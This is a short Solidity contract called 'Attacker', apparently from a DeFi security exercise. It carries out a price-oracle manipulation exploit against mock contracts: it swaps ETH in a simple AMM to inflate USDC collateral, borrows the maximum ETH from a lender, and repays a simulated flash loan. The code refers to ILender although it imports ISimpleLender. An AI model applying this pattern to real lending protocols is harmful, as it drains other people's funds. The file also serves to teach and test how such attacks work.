//SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "./interfaces/IERC20.sol";
import "./interfaces/ISimpleAMM.sol";
import "./interfaces/ISimpleLender.sol";

import "hardhat/console.sol";

contract Attacker {
    function executeAttack(
        address amm,
        address usdc,
        address lender
    ) external payable {
        // make function payable to simulate flash loan of 2 ETH from caller
        require(address(this).balance >= 2e18, "not enough funds");

        // swap 2 ETH for USDC in AMM
        uint256 usdcReceived = ISimpleAMM(amm).swap{value: msg.value}(
            address(0),
            msg.value
        );

        // deposit USDC into lender
        IERC20(usdc).approve(lender, usdcReceived);
        ILender(lender).depositUSDC(usdcReceived);

        // borrow max ETH amount from lender
        uint256 amount = ILender(lender).maxBorrowAmount();
        ILender(lender).borrowETH(amount);

        // repay 'flash loan' amount (2 ETH) to caller
        (bool success, ) = msg.sender.call{value: msg.value}(new bytes(0));
        require(success, "Failed to transfer ETH");
    }

    receive() external payable {}
}
